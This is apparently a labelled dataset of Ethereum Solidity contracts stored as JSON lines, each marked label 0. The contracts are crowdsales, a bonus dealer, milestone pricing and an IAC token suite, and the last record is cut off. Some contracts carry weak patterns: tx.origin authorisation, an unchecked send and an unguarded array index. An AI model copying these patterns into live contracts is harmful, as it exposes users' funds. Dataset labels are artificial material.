{"code":"pragma solidity ^0.4.19;\r\r\n\r\r\ninterface token {\r\r\n    function transfer(address receiver, uint256 amount);\r\r\n}\r\r\n\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n  \r\r\n}\r\r\n\r\r\ncontract GasCrowdsale {\r\r\n    using SafeMath for uint256;\r\r\n    \r\r\n    address public beneficiary;\r\r\n    uint256 public fundingGoal;\r\r\n    uint256 public amountRaised;\r\r\n    uint256 public startdate;\r\r\n    uint256 public deadline;\r\r\n    uint256 public price;\r\r\n    uint256 public fundTransferred;\r\r\n    token public tokenReward;\r\r\n    mapping(address => uint256) public balanceOf;\r\r\n    bool fundingGoalReached = false;\r\r\n    bool crowdsaleClosed = false;\r\r\n\r\r\n    \/\/event GoalReached(address recipient, uint256 totalAmountRaised);\r\r\n    \/\/event FundTransfer(address backer, uint256 amount, bool isContribution);\r\r\n\r\r\n    \/**\r\r\n     * Constrctor function\r\r\n     *\r\r\n     * Setup the owner\r\r\n     *\/\r\r\n    function GasCrowdsale() {\r\r\n        beneficiary = 0x007FB3e94dCd7C441CAA5b87621F275d199Dff81;\r\r\n        fundingGoal = 8000 ether;\r\r\n        startdate = 1518134400;\r\r\n        deadline = startdate + 29 days;\r\r\n        price = 0.0003 ether;\r\r\n        tokenReward = token(0x75c79b88facE8892E7043797570c390bc2Db52A7);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Fallback function\r\r\n     *\r\r\n     * The function without name is the default function that is called whenever anyone sends funds to a contract\r\r\n     *\/\r\r\n    function () payable {\r\r\n        require(!crowdsaleClosed);\r\r\n        uint256 bonus;\r\r\n        uint256 amount = msg.value;\r\r\n        balanceOf[msg.sender] = balanceOf[msg.sender].add(amount);\r\r\n        amountRaised = amountRaised.add(amount);\r\r\n        \r\r\n        \/\/add bounus for funders\r\r\n        if(now >= startdate && now <= startdate + 24 hours ){\r\r\n            amount =  amount.div(price);\r\r\n            bonus = amount.mul(30).div(100);\r\r\n            amount = amount.add(bonus);\r\r\n        }\r\r\n        else if(now > startdate + 24 hours && now <= startdate + 24 hours + 1 weeks ){\r\r\n            amount =  amount.div(price);\r\r\n            bonus = amount.mul(20).div(100);\r\r\n            amount = amount.add(bonus);\r\r\n        }\r\r\n        else if(now > startdate + 24 hours + 1 weeks && now <= startdate + 24 hours + 3 weeks ){\r\r\n            amount =  amount.div(price);\r\r\n            bonus = amount.mul(10).div(100);\r\r\n            amount = amount.add(bonus);\r\r\n        } else {\r\r\n            amount =  amount.div(price);\r\r\n        }\r\r\n        \r\r\n        amount = amount.mul(100000000);\r\r\n        tokenReward.transfer(msg.sender, amount);\r\r\n        \/\/FundTransfer(msg.sender, amount, true);\r\r\n    }\r\r\n\r\r\n    modifier afterDeadline() { if (now >= deadline) _; }\r\r\n\r\r\n    \/**\r\r\n     *ends the campaign after deadline\r\r\n     *\/\r\r\n     \r\r\n    function endCrowdsale() afterDeadline {\r\r\n        crowdsaleClosed = true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * Withdraw the funds\r\r\n     *\/\r\r\n    function safeWithdrawal() {\r\r\n        if (beneficiary == msg.sender) {\r\r\n            if(fundTransferred != amountRaised){\r\r\n               uint256 transferfund;\r\r\n               transferfund = amountRaised.sub(fundTransferred);\r\r\n               fundTransferred = fundTransferred.add(transferfund);\r\r\n               beneficiary.send(transferfund);\r\r\n            } \r\r\n        }\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.2;\r\r\n\r\r\ncontract Token {\r\r\n\tfunction balanceOf(address user) constant returns (uint256 balance);\r\r\n\tfunction transfer(address receiver, uint amount) returns(bool);\r\r\n}\r\r\n\r\r\ncontract BonusDealer {\r\r\n    address public owner;\r\r\n    Token public nexium;\r\r\n    uint public totalDistributed;\r\r\n    address[] public paidAddress;\r\r\n    mapping(address => uint) public paid;\r\r\n    \r\r\n    struct Bonus {\r\r\n        uint bonusInNxc;\r\r\n        uint step;\r\r\n    }\r\r\n    \r\r\n    Bonus[] bonuses;\r\r\n    \r\r\n    event Paid(address);\r\r\n    \r\r\n    uint nxcBought;\r\r\n    \r\r\n    function BonusDealer(){\r\r\n        nexium = Token(0x45e42D659D9f9466cD5DF622506033145a9b89Bc);\r\r\n        owner = msg.sender;\r\r\n        totalDistributed = 0;\r\r\n        bonuses.length++;\r\r\n        bonuses[0] = Bonus(0, 0);\r\r\n        bonuses.length++;\r\r\n        bonuses[1] = Bonus(80*1000, 4000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[2] = Bonus(640*1000, 16000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[3] = Bonus(3000*1000, 50000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[4] = Bonus(8000*1000, 100000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[5] = Bonus(40000*1000, 400000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[6] = Bonus(78000*1000, 650000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[7] = Bonus(140000*1000, 1000000*1000);\r\r\n        bonuses.length++;\r\r\n        bonuses[8] = Bonus(272000*1000, 1700000*1000);\r\r\n    }\r\r\n    \r\r\n    function bonusCalculation(uint _nxcBought) returns(uint){\r\r\n        nxcBought = _nxcBought;\r\r\n        uint totalToPay = 0;\r\r\n        uint toAdd = 1;\r\r\n        while (toAdd != 0){\r\r\n            toAdd = recursiveCalculation();\r\r\n            totalToPay += toAdd;\r\r\n        }\r\r\n        \r\r\n        return totalToPay;\r\r\n    }\r\r\n    \r\r\n    function recursiveCalculation() internal returns(uint){\r\r\n        var i = 8;\r\r\n        while (i != 0 && bonuses[i].step > nxcBought) i--;\r\r\n        nxcBought -= bonuses[i].step;\r\r\n        return bonuses[i].bonusInNxc;\r\r\n    }\r\r\n    \r\r\n    function payDiff(address backer, uint totalNxcBought){\r\r\n        if (msg.sender != owner) throw;\r\r\n        if (paid[backer] == 0) paidAddress[paidAddress.length++] = msg.sender;\r\r\n        uint totalToPay = bonusCalculation(totalNxcBought);\r\r\n        if(totalToPay <= paid[backer]) throw;\r\r\n        totalToPay -= paid[backer];\r\r\n        if (!nexium.transfer(backer, totalToPay)) throw;\r\r\n        paid[backer] += totalToPay;\r\r\n        totalDistributed += totalToPay;\r\r\n        Paid(backer);\r\r\n    }\r\r\n    \r\r\n    function withdrawNexiums(address a){\r\r\n        if (msg.sender != owner) throw;\r\r\n        nexium.transfer(a, nexium.balanceOf(this));\r\r\n    }\r\r\n    \r\r\n    function(){\r\r\n        throw;\r\r\n    }\r\r\n}","label":0}
{"code":"\/**\r\r\n * Interface for defining crowdsale pricing.\r\r\n *\/\r\r\ncontract PricingStrategy {\r\r\n\r\r\n  \/**\r\r\n   * When somebody tries to buy tokens for X eth, calculate how many tokens they get.\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Time milestone based pricing with special support for pre-ico deals.\r\r\n *\/\r\r\ncontract MilestonePricing is PricingStrategy {\r\r\n\r\r\n  uint public constant MAX_MILESTONE = 10;\r\r\n\r\r\n  \/\/ This is our PresaleFundCollector contract\r\r\n  address public preicoContractAddress;\r\r\n\r\r\n  \/\/ Price for presale investors weis per toke\r\r\n  uint public preicoPrice;\r\r\n\r\r\n  \/**\r\r\n  * Define pricing schedule using milestones.\r\r\n  *\/\r\r\n  struct Milestone {\r\r\n\r\r\n      \/\/ UNIX timestamp when this milestone kicks in\r\r\n      uint time;\r\r\n\r\r\n      \/\/ How many tokens per satoshi you will get after this milestone has been passed\r\r\n      uint price;\r\r\n  }\r\r\n\r\r\n  \/\/ Store milestones in a fixed array, so that it can be seen in a blockchain explorer\r\r\n  \/\/ Milestone 0 is always (0, 0)\r\r\n  \/\/ (TODO: change this when we confirm dynamic arrays are explorable)\r\r\n  Milestone[10] public milestones;\r\r\n\r\r\n  \/\/ How many active milestones we have\r\r\n  uint public milestoneCount;\r\r\n\r\r\n  \/**\r\r\n   * @param _preicoContractAddress PresaleFundCollector address\r\r\n   * @param _preicoPrice How many weis one token cost for pre-ico investors\r\r\n   * @param _milestones uint[] miletones Pairs of (time, price)\r\r\n   *\/\r\r\n  function MilestonePricing(address _preicoContractAddress, uint _preicoPrice, uint[] _milestones) {\r\r\n\r\r\n    preicoContractAddress = _preicoContractAddress;\r\r\n    preicoPrice = _preicoPrice;\r\r\n\r\r\n    \/\/ Need to have tuples, length check\r\r\n    if(_milestones.length % 2 == 1 || _milestones.length >= MAX_MILESTONE) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    milestoneCount = _milestones.length \/ 2;\r\r\n\r\r\n    for(uint i=0; i<_milestones.length\/2; i++) {\r\r\n      milestones[i].time = _milestones[i*2];\r\r\n      milestones[i].price = _milestones[i*2+1];\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Iterate through milestones.\r\r\n   *\r\r\n   * You reach end of milestones when price = 0\r\r\n   *\r\r\n   * @return tuple (time, price)\r\r\n   *\/\r\r\n  function getMilestone(uint n) public constant returns (uint, uint) {\r\r\n     return (milestones[n].time, milestones[n].price);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the current milestone or bail out if we are not in the milestone periods.\r\r\n   *\r\r\n   * @return {[type]} [description]\r\r\n   *\/\r\r\n  function getCurrentMilestone() private constant returns (Milestone) {\r\r\n    uint i;\r\r\n    uint price;\r\r\n\r\r\n    for(i=0; i<milestones.length; i++) {\r\r\n      if(now < milestones[i].time) {\r\r\n        return milestones[i-1];\r\r\n      }\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the current price.\r\r\n   *\r\r\n   * @return The current price or 0 if we are outside milestone period\r\r\n   *\/\r\r\n  function getCurrentPrice() public constant returns (uint result) {\r\r\n    return getCurrentMilestone().price;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Calculate the current price for buy in amount.\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint) {\r\r\n\r\r\n    \/\/ This investor is coming through pre-ico\r\r\n    if(msgSender == preicoContractAddress) {\r\r\n      return value \/ preicoPrice;\r\r\n    }\r\r\n\r\r\n    uint price = getCurrentPrice();\r\r\n    return value \/ price;\r\r\n  }\r\r\n\r\r\n  function() payable {\r\r\n    throw; \/\/ No money on this contract\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.17;\r\r\n\r\r\nlibrary SafeMath {\r\r\n\r\r\n    \/**\r\r\n    * Multiplication with safety check\r\r\n    *\/\r\r\n    function Mul(uint256 a, uint256 b) pure internal returns (uint256) {\r\r\n      uint256 c = a * b;\r\r\n      \/\/check result should not be other wise until a=0\r\r\n      assert(a == 0 || c \/ a == b);\r\r\n      return c;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n    * Division with safety check\r\r\n    *\/\r\r\n    function Div(uint256 a, uint256 b) pure internal returns (uint256) {\r\r\n      \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n      uint256 c = a \/ b;\r\r\n      \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n      return c;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n    * Subtraction with safety check\r\r\n    *\/\r\r\n    function Sub(uint256 a, uint256 b) pure internal returns (uint256) {\r\r\n      \/\/b must be greater that a as we need to store value in unsigned integer\r\r\n      assert(b <= a);\r\r\n      return a - b;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n    * Addition with safety check\r\r\n    *\/\r\r\n    function Add(uint256 a, uint256 b) pure internal returns (uint256) {\r\r\n      uint256 c = a + b;\r\r\n      \/\/We need to check result greater than only one number for valid Addition\r\r\n      \/\/refer https:\/\/ethereum.stackexchange.com\/a\/15270\/16048\r\r\n      assert(c >= a);\r\r\n      return c;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * Contract \"ERC20Basic\"\r\r\n * Purpose: Defining ERC20 standard with basic functionality like - CheckBalance and Transfer including Transfer event\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n\r\r\n  \/\/Give realtime totalSupply of IAC token\r\r\n  uint256 public totalSupply;\r\r\n\r\r\n  \/\/Get IAC token balance for provided address\r\r\n  function balanceOf(address who) view public returns (uint256);\r\r\n\r\r\n  \/\/Transfer IAC token to provided address\r\r\n  function transfer(address _to, uint256 _value) public returns(bool ok);\r\r\n\r\r\n  \/\/Emit Transfer event outside of blockchain for every IAC token transfer\r\r\n  event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * Contract \"ERC20\"\r\r\n * Purpose: Defining ERC20 standard with more advanced functionality like - Authorize spender to transfer IAC token\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n\r\r\n  \/\/Get IAC token amount that spender can spend from provided owner&#39;s account\r\r\n  function allowance(address owner, address spender) public view returns (uint256);\r\r\n\r\r\n  \/\/Transfer initiated by spender\r\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns(bool ok);\r\r\n\r\r\n  \/\/Add spender to authrize for spending specified amount of IAC Token\r\r\n  function approve(address _spender, uint256 _value) public returns(bool ok);\r\r\n\r\r\n  \/\/Emit event for any approval provided to spender\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Contract \"Ownable\"\r\r\n * Purpose: Defines Owner for contract and provide functionality to transfer ownership to another account\r\r\n *\/\r\r\ncontract Ownable {\r\r\n\r\r\n  \/\/owner variable to store contract owner account\r\r\n  address public owner;\r\r\n\r\r\n  \/\/Constructor for the contract to store owner&#39;s account on deployment\r\r\n  function Ownable() public {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  \/\/modifier to check transaction initiator is only owner\r\r\n  modifier onlyOwner() {\r\r\n    require (msg.sender == owner);\r\r\n      _;\r\r\n  }\r\r\n\r\r\n  \/\/ownership can be transferred to provided newOwner. Function can only be initiated by contract owner&#39;s account\r\r\n  function transferOwnership(address newOwner) public onlyOwner {\r\r\n    require (newOwner != address(0));\r\r\n      owner = newOwner;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * Contract \"Pausable\"\r\r\n * Purpose: Contract to provide functionality to pause and resume Sale in case of emergency\r\r\n *\/\r\r\ncontract Pausable is Ownable {\r\r\n\r\r\n  \/\/flag to indicate whether Sale is paused or not\r\r\n  bool public stopped;\r\r\n\r\r\n  \/\/Emit event when any change happens in crowdsale state\r\r\n  event StateChanged(bool changed);\r\r\n\r\r\n  \/\/modifier to continue with transaction only when Sale is not paused\r\r\n  modifier stopInEmergency {\r\r\n    require(!stopped);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/modifier to continue with transaction only when Sale is paused\r\r\n  modifier onlyInEmergency {\r\r\n    require(stopped);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, pause Sale\r\r\n  function emergencyStop() external onlyOwner  {\r\r\n    stopped = true;\r\r\n    \/\/Emit event when crowdsale state changes\r\r\n    StateChanged(true);\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, resumes Sale\r\r\n  function release() external onlyOwner onlyInEmergency {\r\r\n    stopped = false;\r\r\n    \/\/Emit event when crowdsale state changes\r\r\n    StateChanged(true);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * Contract \"IAC\"\r\r\n * Purpose: Create IAC token\r\r\n *\/\r\r\ncontract Injii is ERC20, Ownable {\r\r\n\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  \/* Public variables of the token *\/\r\r\n  \/\/To store name for token\r\r\n  string public constant name = \"Injii Access Coins\";\r\r\n\r\r\n  \/\/To store symbol for token\r\r\n  string public constant symbol = \"IAC\";\r\r\n\r\r\n  \/\/To store decimal places for token\r\r\n  uint8 public constant decimals = 0;\r\r\n\r\r\n  \/\/To store decimal version for token\r\r\n  string public version = &#39;v1.0&#39;;\r\r\n\r\r\n  \/\/flag to indicate whether transfer of IAC Token is allowed or not\r\r\n  bool public locked;\r\r\n\r\r\n  \/\/map to store IAC Token balance corresponding to address\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/\/To store spender with allowed amount of IAC Token to spend corresponding to IAC Token holder&#39;s account\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n  \/\/To handle ERC20 short address attack\r\r\n  modifier onlyPayloadSize(uint256 size) {\r\r\n     require(msg.data.length >= size + 4);\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  \/\/ Lock transfer during Sale\r\r\n  modifier onlyUnlocked() {\r\r\n    require(!locked);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/Contructor to define IAC Token properties\r\r\n  function Injii() public {\r\r\n    \/\/ lock the transfer function during Sale\r\r\n    locked = true;\r\r\n\r\r\n    \/\/initial token supply is 0\r\r\n    totalSupply = 0;\r\r\n  }\r\r\n\r\r\n  \/\/Implementation for transferring IAC Token to provided address\r\r\n  function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) public onlyUnlocked returns (bool){\r\r\n\r\r\n    \/\/Check provided IAC Token should not be 0\r\r\n    if (_to != address(0) && _value >= 1) {\r\r\n      \/\/deduct IAC Token amount from transaction initiator\r\r\n      balances[msg.sender] = balances[msg.sender].Sub(_value);\r\r\n      \/\/Add IAC Token to balace of target account\r\r\n      balances[_to] = balances[_to].Add(_value);\r\r\n      \/\/Emit event for transferring IAC Token\r\r\n      Transfer(msg.sender, _to, _value);\r\r\n      return true;\r\r\n    }\r\r\n    else{\r\r\n      return false;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/\/Transfer initiated by spender\r\r\n  function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) public onlyUnlocked returns (bool) {\r\r\n\r\r\n    \/\/Check provided IAC Token should not be 0\r\r\n    if (_to != address(0) && _from != address(0)) {\r\r\n      \/\/Get amount of IAC Token for which spender is authorized\r\r\n      var _allowance = allowed[_from][msg.sender];\r\r\n      \/\/Add amount of IAC Token in trarget account&#39;s balance\r\r\n      balances[_to] = balances[_to].Add(_value);\r\r\n      \/\/Deduct IAC Token amount from _from account\r\r\n      balances[_from] = balances[_from].Sub(_value);\r\r\n      \/\/Deduct Authorized amount for spender\r\r\n      allowed[_from][msg.sender] = _allowance.Sub(_value);\r\r\n      \/\/Emit event for Transfer\r\r\n      Transfer(_from, _to, _value);\r\r\n      return true;\r\r\n    }else{\r\r\n      return false;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/\/Get IAC Token balance for provided address\r\r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  \/\/Add spender to authorize for spending specified amount of IAC Token\r\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\r\n    require(_spender != address(0));\r\r\n    \/\/do not allow decimals\r\r\n    uint256 iacToApprove = _value;\r\r\n    allowed[msg.sender][_spender] = iacToApprove;\r\r\n    \/\/Emit event for approval provided to spender\r\r\n    Approval(msg.sender, _spender, iacToApprove);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/\/Get IAC Token amount that spender can spend from provided owner&#39;s account\r\r\n  function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract Metadata {\r\r\n    \r\r\n    address public owner;\r\r\n    \r\r\n    mapping (uint => address) registerMap;\r\r\n\r\r\n    function Metadata() public {\r\r\n        owner = msg.sender;\r\r\n        registerMap[0] = msg.sender;\r\r\n    }\r\r\n\r\r\n    \/\/get contract address by its ID\r\r\n    function getAddress (uint addressId) public view returns (address){\r\r\n        return registerMap[addressId];\r\r\n    }\r\r\n\r\r\n    \/\/add or replace contract address by id. This is also the order of deployment\r\r\n    \/\/0 = owner\r\r\n    \/\/1 = Ecosystem\r\r\n    \/\/2 = Crowdsale. This will deploy the token contract also.\r\r\n    \/\/3 = Company Inventory\r\r\n    function addAddress (uint addressId, address addressContract) public {\r\r\n        assert(addressContract != 0x0 );\r\r\n        require (owner == msg.sender || owner == tx.origin);\r\r\n        registerMap[addressId] = addressContract;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Ecosystem is Ownable{\r\r\n\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n    \/\/variable of type metadata to store metadata contract object\r\r\n    Metadata private objMetadata;\r\r\n    Crowdsale private objCrowdsale;\r\r\n    uint256 constant private ecosystemContractID = 1;\r\r\n    uint256 constant private crowdsaleContractID = 2;\r\r\n    bool public crowdsaleAddressSet;\r\r\n    event TokensReceived(address receivedFrom, uint256 numberOfTokensReceive);\r\r\n\r\r\n    \/\/Constructor\r\r\n    function Ecosystem(address _metadataContractAddr) public {\r\r\n        assert(_metadataContractAddr != address(0));\r\r\n        \/\/passing address of meta data contract to metadata type address variable\r\r\n        objMetadata = Metadata(_metadataContractAddr);\r\r\n        \/\/register this contract in metadata\r\r\n        objMetadata.addAddress(ecosystemContractID, this);\r\r\n    }\r\r\n\r\r\n    function SetCrowdsaleAddress () public onlyOwner {\r\r\n        require(!crowdsaleAddressSet);\r\r\n        address crowdsaleContractAddress = objMetadata.getAddress(crowdsaleContractID);\r\r\n        assert(crowdsaleContractAddress != address(0));\r\r\n        objCrowdsale = Crowdsale(crowdsaleContractAddress);\r\r\n        crowdsaleAddressSet = true;\r\r\n    }\r\r\n\r\r\n    function rewardUser(address user, uint256 iacToSend) public onlyOwner{\r\r\n        assert(crowdsaleAddressSet);\r\r\n        objCrowdsale.transfer(user, iacToSend);\r\r\n    }\r\r\n\r\r\n    function tokenFallback(address _from, uint _value){\r\r\n        TokensReceived(_from, _value);\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\ncontract CompanyInventory is Ownable{\r\r\n    using SafeMath for uint256;\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n    \/\/record timestamp when the lock was initiated\r\r\n    uint256 public startBlock;\r\r\n    \/\/to record how many tokens are unlocked\r\r\n    uint256 public unlockedTokens;\r\r\n    uint256 public initialReleaseDone = 0;\r\r\n    uint256 public secondReleaseDone = 0;\r\r\n    uint256 public totalSuppliedAfterLock = 0;\r\r\n    uint256 public balance = 0;\r\r\n    uint256 public totalSupplyFromInventory;\r\r\n    \/\/total number of tokens available in inventory\r\r\n    uint256 public totalRemainInInventory;\r\r\n    \/\/variable of type metadata to store metadata contract object\r\r\n    Metadata private objMetadata;\r\r\n    Crowdsale private objCrowdsale;\r\r\n    uint256 constant private crowdsaleContractID = 2;\r\r\n    uint256 constant private inventoryContractID = 3;\r\r\n    \/\/Emit event when tokens are transferred from company inventory\r\r\n    event TransferredUnlockedTokens(address addr, uint value, bytes32 comment);\r\r\n    \/\/Emit event when any change happens in crowdsale state\r\r\n    event StateChanged(bool changed);\r\r\n    \r\r\n    \/\/constructor\r\r\n    function CompanyInventory(address _metadataContractAddr) public {\r\r\n        assert(_metadataContractAddr != address(0));\r\r\n        \/\/passing address of meta data contract to metadat type address variable\r\r\n        objMetadata = Metadata(_metadataContractAddr);\r\r\n        objMetadata.addAddress(inventoryContractID, this);\r\r\n        objCrowdsale = Crowdsale(objMetadata.getAddress(crowdsaleContractID));\r\r\n    }\r\r\n    \r\r\n    function initiateLocking (uint256 _alreadyTransferredTokens) public {\r\r\n        require(msg.sender == objMetadata.getAddress(crowdsaleContractID) && startBlock == 0);\r\r\n        startBlock = now;\r\r\n        unlockedTokens = 0;\r\r\n        balance = objCrowdsale.balanceOf(this);\r\r\n        totalSupplyFromInventory = _alreadyTransferredTokens;\r\r\n        totalRemainInInventory = balance.Add(_alreadyTransferredTokens).Sub(_alreadyTransferredTokens);\r\r\n        StateChanged(true);\r\r\n    }\r\r\n    \r\r\n    function releaseTokens () public onlyOwner {\r\r\n        require(startBlock > 0);\r\r\n        if(initialReleaseDone == 0){\r\r\n            require(now >= startBlock.Add(1 years));\r\r\n            unlockedTokens =  balance\/2;\r\r\n            initialReleaseDone = 1;\r\r\n        }\r\r\n        else if(secondReleaseDone == 0){\r\r\n            require(now >= startBlock.Add(2 years));\r\r\n            unlockedTokens = balance;\r\r\n            secondReleaseDone = 1;\r\r\n        }\r\r\n        StateChanged(true);\r\r\n    }\r\r\n    \r\r\n    \/*\r\r\n    * To enable transferring tokens from company inventory\r\r\n    *\/\r\r\n    function TransferFromCompanyInventory(address beneficiary,uint256 iacToCredit,bytes32 comment) onlyOwner external {\r\r\n        require(beneficiary != address(0));\r\r\n        require(totalSuppliedAfterLock.Add(iacToCredit) <= unlockedTokens);\r\r\n        objCrowdsale.transfer(beneficiary,iacToCredit);\r\r\n        \/\/Update total supply for IAC Token\r\r\n        totalSuppliedAfterLock = totalSuppliedAfterLock.Add(iacToCredit);\r\r\n        totalSupplyFromInventory = totalSupplyFromInventory.Add(iacToCredit);\r\r\n        \/\/total number of tokens remaining in inventory\r\r\n        totalRemainInInventory = totalRemainInInventory.Sub(iacToCredit);\r\r\n        \/\/ send event for transferring IAC Token on offline payment\r\r\n        TransferredUnlockedTokens(beneficiary, iacToCredit, comment);\r\r\n        \/\/Emit event when crowdsale state changes\r\r\n        StateChanged(true);\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Crowdsale is Injii, Pausable {\r\r\n    using SafeMath for uint256;\r\r\n    \/\/Record the timestamp when sale starts\r\r\n    uint256 public startBlock;\r\r\n    \/\/No of days for which the complete crowdsale will run\r\r\n    uint256 public constant durationCrowdSale = 25 days;\r\r\n    \/\/the gap period between ending of primary crowdsale and starting of secondary crowdsale\r\r\n    uint256 public constant gapInPrimaryCrowdsaleAndSecondaryCrowdsale = 2 years;\r\r\n    \/\/Record the timestamp when sale ends\r\r\n    uint256 public endBlock;\r\r\n\r\r\n    \/\/maximum number of tokens available in company inventory\r\r\n    uint256 public constant maxCapCompanyInventory = 250e6;\r\r\n    \/\/Maximum number of tokens in crowdsale = 500M tokens\r\r\n    uint256 public constant maxCap = 500e6;\r\r\n    uint256 public constant maxCapEcosystem = 250e6;\r\r\n    uint256 public constant numberOfTokensToAvail50PercentDiscount = 2e6;\r\r\n    uint256 public constant numberOfTokensToAvail25percentDiscount = 5e5;\r\r\n    uint256 public constant minimumNumberOfTokens = 2500;\r\r\n    uint256 public targetToAchieve;\r\r\n\r\r\n    bool public inventoryLocked = false;\r\r\n    uint256 public totalSupply;\r\r\n    \/\/Total tokens for crowdsale including mint and transfer \r\r\n    uint256 public totalSupplyForCrowdsaleAndMint = 0;\r\r\n    \/\/coinbase account where all ethers should go\r\r\n    address public coinbase;\r\r\n    \/\/To store total number of ETH received\r\r\n    uint256 public ETHReceived;\r\r\n    \/\/total number of tokens supplied from company inventory\r\r\n    uint256 public totalSupplyFromInventory;\r\r\n    \/\/total number of tokens available in inventory\r\r\n    uint256 public totalRemainInInventory;\r\r\n    \/\/number of tokens per ether\r\r\n    uint256 public getPrice;\r\r\n    \/\/ To indicate Sale status\r\r\n    \/\/crowdsaleStatus=0 => crowdsale not started\r\r\n    \/\/crowdsaleStatus=1 => crowdsale started;\r\r\n    \/\/crowdsaleStatus=2 => crowdsale finished\r\r\n    uint256 public crowdsaleStatus;\r\r\n    \/\/type of CrowdSale:\r\r\n    \/\/1 = crowdsale\r\r\n    \/\/2 = seconadry crowdsale for remaining tokens\r\r\n    uint8 public crowdSaleType;\r\r\n    \/\/Emit event on receiving ETH\r\r\n    event ReceivedETH(address addr, uint value);\r\r\n    \/\/Emit event on transferring IAC Token to user when payment is received in traditional ways\r\r\n    event MintAndTransferIAC(address addr, uint value, bytes32 comment);\r\r\n    \/\/Emit event when tokens are transferred from company inventory\r\r\n    event SuccessfullyTransferedFromCompanyInventory(address addr, uint value, bytes32 comment);\r\r\n    \/\/event to log token supplied\r\r\n    event TokenSupplied(address indexed beneficiary, uint256 indexed tokens, uint256 value);\r\r\n    \/\/Emit event when any change happens in crowdsale state\r\r\n    event StateChanged(bool changed);\r\r\n\r\r\n    \/\/variable to store object of Metadata contract\r\r\n    Metadata private objMetada;\r\r\n    Ecosystem private objEcosystem;\r\r\n    CompanyInventory private objCompanyInventory;\r\r\n    address private ecosystemContractAddress;\r\r\n    \/\/ID of Ecosystem contract\r\r\n    uint256 constant ecosystemContractID = 1;\r\r\n    \/\/ID of this contract\r\r\n    uint256 constant private crowdsaleContractID = 2;\r\r\n    \/\/ID of company inventory\r\r\n    uint256 constant private inventoryContractID = 3;\r\r\n\r\r\n    